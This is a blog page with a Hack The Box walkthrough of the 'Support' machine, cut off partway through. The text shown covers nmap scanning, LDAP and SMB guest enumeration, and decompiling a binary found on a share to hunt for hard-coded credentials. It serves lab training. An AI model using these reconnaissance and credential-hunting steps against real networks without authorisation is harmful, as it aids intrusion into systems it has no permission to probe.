<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <link rel="stylesheet" href="/css/6_image.css">
    <meta name="generator" content="Hugo 0.135.0">

    

    

    
        
            <meta
                name="description"
                content="Saucy Monk" />
        

        
            <meta
                name="keywords"
                content="hacking, AD" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Support HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.3dfa67019948021bac47127fc3871ea0ea2653a0ab6c259457c2d876dcbe0a26bccd10c948b74afee0afc53dec91c0084112a7fdaed666956f19a48e8346ffc7.css"
                integrity="sha512-PfpnAZlIAhusRxJ/w4ceoOomU6CrbCWUV8LYdty&#43;Cia8zRDJSLdK/uCvxT3skcAIQRKn/a7WZpVvGaSOg0b/xw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    
</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Support HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Box Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/escape-box/" title="./escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Support HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.06.09"
                            >2024.06.09
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        26 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/easy/"
                            class="tag-btn">
                            Easy
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/ldap/"
                            class="tag-btn">
                            LDAP
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/support-box/" class="bread-btn">
    

    
        
            Support HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#name-of-box-htb-support">Intelligence Hack The Box Support Walkthrough/Writeup:</a></li>
    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
      <ul>
        <li><a href="#standard-nmap-scan-to-get-a-lay-of-the-land">Standard Nmap Scan to get a lay of the land:</a></li>
        <li><a href="#in-depth-scan-complete">In Depth Scan Complete:</a></li>
        <li><a href="#checking-for-ldap-anonymous-bind">Checking For LDAP Anonymous bind:</a></li>
        <li><a href="#smb-enumeration">SMB Enumeration:</a></li>
        <li><a href="#userinfo-dot-exe-binary-enumeration"><code>UserInfo.exe</code> Binary Enumeration:</a></li>
      </ul>
    </li>
    <li><a href="#2-dot-foothold">2. Foothold:</a>
      <ul>
        <li><a href="#enumerating-the-domain-using-ldap">Enumerating the Domain using LDAP:</a></li>
        <li><a href="#finding-passwords-in-user-fields">Finding Passwords in User Fields:</a></li>
        <li><a href="#connecting-with-evil-winrm">Connecting with Evil-WinRM:</a></li>
      </ul>
    </li>
    <li><a href="#3-dot-priv-esc">3. Priv-Esc:</a>
      <ul>
        <li><a href="#enumerating-the-domain-with-bloodhound">Enumerating the domain with bloodhound:</a></li>
        <li><a href="#genericall-privileges-on-the-domain-controller-dot"><code>GenericAll</code> privileges on the domain controller.</a></li>
        <li><a href="#the-attack-kerberos-resource-based-constrained-delegation-computer-object-takeover">The attack, Kerberos Resource-based Constrained Delegation - Computer Object Takeover:</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-ownership">4. Ownership:</a>
      <ul>
        <li><a href="#performing-the-attack">Performing the Attack:</a></li>
      </ul>
    </li>
    <li><a href="#5-dot-pillaging-persistence">5. Pillaging/Persistence:</a></li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
        <li><a href="#thoughts">Thoughts:</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="name-of-box-htb-support">Intelligence Hack The Box Support Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/Support">https://app.hackthebox.com/machines/Support</a></li>
</ul>
<h2 id="1-dot-enumeration">1. Enumeration:</h2>
<h3 id="standard-nmap-scan-to-get-a-lay-of-the-land">Standard Nmap Scan to get a lay of the land:</h3>
<ul>
<li>I always do a basic one just to look for low hanging fruit, this means that whilst my main scan is running I can enumerate the low hanging fruit and look for easy wins.</li>
<li><figure><img src="/ox-hugo/2024-09-02-171851_.png">
</figure>
</li>
<li>With that out the way I start my main nmap scan.
<ul>
<li><code>sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP -iL scopeList</code></li>
<li>Why I use this specific scan:
<ul>
<li>
<p><code>-p-</code>:</p>
<ul>
<li>Scans all 65,535 TCP ports on the target(s).</li>
</ul>
</li>
<li>
<p><code>-sV</code>:</p>
<ul>
<li>Performs service version detection to determine what service and version is running on each open port.</li>
</ul>
</li>
<li>
<p><code>-sC</code>:</p>
<ul>
<li>Runs a set of default scripts from Nmap’s script engine (NSE) that perform various checks like vulnerability detection, information gathering, etc.</li>
</ul>
</li>
<li>
<p><code>-O</code>:</p>
<ul>
<li>Attempts to determine the operating system of the target machine.</li>
</ul>
</li>
<li>
<p><code>--disable-arp-ping</code>:</p>
<ul>
<li>Disables ARP pinging; useful when ARP requests may not be useful or could be blocked by the network.</li>
</ul>
</li>
<li>
<p><code>-Pn</code>:</p>
<ul>
<li>No ping scan:</li>
<li>Treats the target hosts as &ldquo;up&rdquo; without sending initial pings, useful for bypassing ping-based defenses.</li>
</ul>
</li>
<li>
<p><code>-oA FullTCP</code>:</p>
<ul>
<li>Saves the scan results in three formats (.nmap, .xml, and .gnmap) with the filename prefix &ldquo;FullTCP&rdquo;, means I can then pass to other scanners such as aquatone or eyewitness which takes <code>.xml</code> NMAP files as input.</li>
</ul>
</li>
<li>
<p><code>-iL scopeList</code>:</p>
<ul>
<li>This is just my target list of hosts. I also map single domain to a bash alias in my <code>~/.zshrc</code> as it&rsquo;s convient for other tools</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="in-depth-scan-complete">In Depth Scan Complete:</h3>
<ul>
<li><figure><img src="/ox-hugo/2024-09-02-175443_.png">
</figure>
</li>
<li>We can see the OS is most likely Windows Server 2022 &amp; that SMB signing is enabled and required.</li>
</ul>
<h3 id="checking-for-ldap-anonymous-bind">Checking For LDAP Anonymous bind:</h3>
<ul>
<li>As LDAP is running, I want to check if Anonymous Bind is enabled as it&rsquo;s an easy win to gather information.
<ul>
<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
<ul>
<li>We can actually retrieve a significant amount of information via anonymous bind such as:
<ul>
<li>A list of all users</li>
<li>A list of all groups</li>
<li>A list of all computers.</li>
<li>User account attributes.</li>
<li>The domain password policy.</li>
<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
<li>Passwords stored in the description fields</li>
</ul>
</li>
<li>The added benefit of using LDAP to perform these queries is that these are most likely not going to trigger any sort of AV etc as LDAP is how AD communicates.</li>
</ul>
</li>
</ul>
</li>
<li>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
<ul>
<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
</ul>
</li>
</ul>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<ul>
<li><strong>I run my script but anonymous bind is not enabled, however we get some valuable information such as the Domain Functionality level</strong>.
<ul>
<li>
<p><!-- raw HTML omitted -->We have the domain functionality level<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>      Other:
</span></span><span style="display:flex;"><span>      domainFunctionality:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>      forestFunctionality:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>      domainControllerFunctionality:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>      rootDomainNamingContext:
</span></span><span style="display:flex;"><span>        DC<span style="color:#f92672">=</span>support,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
<ul>
<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
<ul>
<li>
<p>Note that any host os can used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
</li>
<li>
<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
</li>
<li>
<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
</li>
<li>
<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Functional Level Number</th>
          <th style="text-align: left">Corresponding OS</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">0</td>
          <td style="text-align: left">Windows 2000</td>
      </tr>
      <tr>
          <td style="text-align: left">1</td>
          <td style="text-align: left">Windows Server 2003 Interim</td>
      </tr>
      <tr>
          <td style="text-align: left">2</td>
          <td style="text-align: left">Windows Server 2003</td>
      </tr>
      <tr>
          <td style="text-align: left">3</td>
          <td style="text-align: left">Windows Server 2008</td>
      </tr>
      <tr>
          <td style="text-align: left">4</td>
          <td style="text-align: left">Windows Server 2008 R2</td>
      </tr>
      <tr>
          <td style="text-align: left">5</td>
          <td style="text-align: left">Windows Server 2012</td>
      </tr>
      <tr>
          <td style="text-align: left">6</td>
          <td style="text-align: left">Windows Server 2012 R2</td>
      </tr>
      <tr>
          <td style="text-align: left">7</td>
          <td style="text-align: left">Windows Server 2016</td>
      </tr>
      <tr>
          <td style="text-align: left">8</td>
          <td style="text-align: left">Windows Server 2019</td>
      </tr>
      <tr>
          <td style="text-align: left">9</td>
          <td style="text-align: left">Windows Server 2022</td>
      </tr>
  </tbody>
</table>
<ul>
<li><strong>Note</strong>:
<ul>
<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>support,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>  schemaNamingContext:
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>support,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ul>
<h3 id="smb-enumeration">SMB Enumeration:</h3>
<h4 id="connecting-via-null-and-guest-sessions">Connecting Via Null &amp; Guest sessions:</h4>
<ul>
<li>
<p>I try an null session but it is denied.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-02-175718_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>However it does allow us to connect using the built-in &ldquo;Guest&rdquo; account, and we can read the <code>support-tools</code> share.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-02-175818_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="connecting-to-smb">Connecting to SMB:</h4>
<ul>
<li>We can see 3 interesting files in the smb share.
<ul>
<li>npp.8.4.1.portable.x64.zip</li>
<li>SysinternalsSuite.zip
<ul>
<li>I suspect this is just a copy of the popular SysInternals suite of tools, but want to verify myself that nothing additional has been added to the <code>.zip</code></li>
</ul>
</li>
<li>UserInfo.exe.zip
<ul>
<li>Th</li>
</ul>
</li>
<li><figure><img src="/ox-hugo/2024-09-02-180608_.png">
</figure>
</li>
</ul>
</li>
<li>I download all the files:
<ul>
<li>The last file is particular interesting, &ldquo;<code>UserInfo.exe.zip</code>&rdquo; as this does not look like a known binary, so may be made by the support staff themselves.</li>
</ul>
</li>
</ul>
<h3 id="userinfo-dot-exe-binary-enumeration"><code>UserInfo.exe</code> Binary Enumeration:</h3>
<h4 id="running-strings-on-it">Running Strings On it:</h4>
<ul>
<li>First of all let&rsquo;s run strings on it to see if we can extract any valuable information:
<ul>
<li><code>strings UserInfo.exe</code>
<ul>
<li>We can see references to enc(oding) passwords and getting passwords as well as usernames, first name, last name.
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-072350_.png">
</figure>
</li>
</ul>
</li>
<li>We can also it tells us what version of the <code>.NET</code> framework is, <code>v4.8</code> (this is useful for our next step)
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-072515_.png">
</figure>
</li>
</ul>
</li>
<li>I am guessing, this is using <code>LDAP</code> to interact with the AD environment, this is only a guess though. Hopefully it should trigger some traffic in Wireshark if we run it.</li>
</ul>
</li>
<li>There is not much more information we can glean from strings so let&rsquo;s move on.</li>
</ul>
</li>
</ul>
<h4 id="running-the-binary-itself">Running the binary itself:</h4>
<p>As it&rsquo;s a windows binary we can either run it in windows or use Wine, as I run Arch (btw), as my host OS I am going to run it via Wine in my WM.</p>
<ol>
<li><strong>Lets check if the binary is 32 or 64 bit</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-071307_.png">
</figure>

<ul>
<li>We can see it&rsquo;s 32bit so we need to install 32bit support for wine also.</li>
</ul>
</li>
<li><!-- raw HTML omitted -->Detour, Lets install Wine on Kali Together<!-- raw HTML omitted -->:
<ul>
<li>If you haven&rsquo;t installed Wine in Kali before you need to follow the below steps:
<ul>
<li><strong>Note</strong>: Remember when we ran <code>strings</code> on the binary and we saw it was using <code>v.4.8</code> of the <code>.NET</code> framework, well we need that information here to ensure we have the correct version running.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># This is the what enables 32 bit architecture.</span>
</span></span><span style="display:flex;"><span>sudo dpkg --add-architecture i386
</span></span><span style="display:flex;"><span>sudo apt update
</span></span><span style="display:flex;"><span>sudo apt install wine
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is what installs the wine 32 bit libraries</span>
</span></span><span style="display:flex;"><span>sudo apt install wine32:i386
</span></span><span style="display:flex;"><span>winecfg
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is just a nice easier way to work with wine.</span>
</span></span><span style="display:flex;"><span>sudo apt-get install winetricks
</span></span><span style="display:flex;"><span>winetricks dotnet48
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is not wine based but we will need this to use LDAP (thank me later)</span>
</span></span><span style="display:flex;"><span>sudo apt install winbind</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h5 id="running-the-binary-and-monitoring-traffic-with-wireshark">Running the Binary &amp; Monitoring Traffic with Wireshark:</h5>
<ul>
<li>
<p>We can see it takes a couple of args, find, user &amp; enabling verbosity</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-072927_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I setup Wireshark to monitor traffic and then run the below command</strong>:</p>
<ul>
<li><img src="/ox-hugo/2024-09-03-091242_.png" alt=""> &amp; get the error:
<ul>
<li><code>0114:err:winediag:ntlm_check_version ntlm_auth was not found</code></li>
<li>After some googling, I find that the dep <code>winbind</code> is required, I install and then run again &amp; I am given ALOT more options.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>First Real Run</strong>:</p>
<ul>
<li>I run the program and to make life easier check for all users.</li>
<li><figure><img src="/ox-hugo/2024-09-03-091507_.png">
</figure>

<ul>
<li>I see that I get a lot of traffic, however what is interesting is I am only getting the latter half of the connection as with LDAP there should be a bind request happening, however I am only getting the unbind…which is strange.
<ul>
<li>Typically with the bind request the password, DN and auth types are passed but this is not present here. It could be <code>Wine</code> being unreliable so back to the drawing board.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Note</strong>:</p>
<ul>
<li>One thing that is interesting is that this program does not appear to take a password/creds as an argument &amp; it also appears to have some LDAP strings within it. Which means unless the entire domain is running without the need the need for authentication (i doubt it) then there must be some hard-coded LDAP creds within this program.</li>
</ul>
</li>
</ul>
<h4 id="de-compiling-the-binary-with-ilspy">De-compiling the Binary with ILSpy:</h4>
<p>As I can&rsquo;t see any traffic generated from the binary, which is odd as it does seem to be using LDAP parameters, I will de-compile the binary to see if there are any hard coded credentials/useful information within it.</p>
<p>We will use ILSpy to de-compile. It&rsquo;s a cross platform tool that enables us to de-compile <code>.NET</code> programs.</p>
<ul>
<li><a href="https://github.com/icsharpcode/AvaloniaILSpy">https://github.com/icsharpcode/AvaloniaILSpy</a></li>
</ul>
<h5 id="what-is-ilspy">What is ILSpy?:</h5>
<ul>
<li>ILSpy is a tool for de-compiling .NET programs, which is a fancy way of saying it can take an already-compiled .NET application (the <code>.exe</code> or <code>.dll</code> files) and reverse-engineer it back into readable source code.</li>
<li>It&rsquo;s super handy if you&rsquo;re trying to understand how a particular piece of software works, want to check for security vulnerabilities, or even need to recover your own code that you might have lost. ILSpy doesn&rsquo;t give you the exact original code, but it gives you something close enough that you can follow along.</li>
<li>It’s open-source and free, which makes it a go-to for a lot of developers, especially in the <code>.NET</code> community. Whether you&rsquo;re doing research, debugging, or just satisfying your curiosity, ILSpy can be a powerful tool to have in your toolkit.</li>
</ul>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h5 id="install-ilspy">Install ILSpy:</h5>
<ul>
<li>If you haven&rsquo;t got it installed, you can do so here.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64/Release.zip
</span></span><span style="display:flex;"><span>unzip Linux.x64.Release.zip
</span></span><span style="display:flex;"><span>unzip ILSpy-linux-x64-Release.zip
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This is the second archive we must extract</span></span></span></code></pre></div>
    
</div>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p><strong>Launch ILSpy</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="cd%20artifacts/linux-x64%0asudo%20./ILSpy">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cd artifacts/linux-x64
</span></span><span style="display:flex;"><span>sudo ./ILSpy</span></span></code></pre></div>
    
</div>
<p><strong>Load our binary &amp; turn on dark mode</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-081735_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h5 id="discoveries">Discoveries:</h5>
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-082608_.png">
</figure>

<ul>
<li>I search for <code>ldap</code> and as suspected I find the following information.
<ul>
<li>As well as the domain DN in an LDAP query string <code>&quot;LDAP://support.htb</code> I also see that a variable call <code>password</code> is being passed as well and that the <code>AuthenticationTypes</code> is set to <code>1</code></li>
<li>This is an LDAP Bind Request with all the information being passed:
<ul>
<li>
<p>The below is taken from <a href="https://ldap.com/the-ldap-bind-operation/">https://ldap.com/the-ldap-bind-operation/</a></p>
<blockquote>
<ul>
<li>An LDAP bind request includes three elements:
<ul>
<li>The LDAP protocol version that the client wants to use. This is an integer value, and version 3 is the most recent version. Some very old clients (or clients written with very old APIs) may still use LDAP version 2, but new applications should always be written to use LDAP version 3.</li>
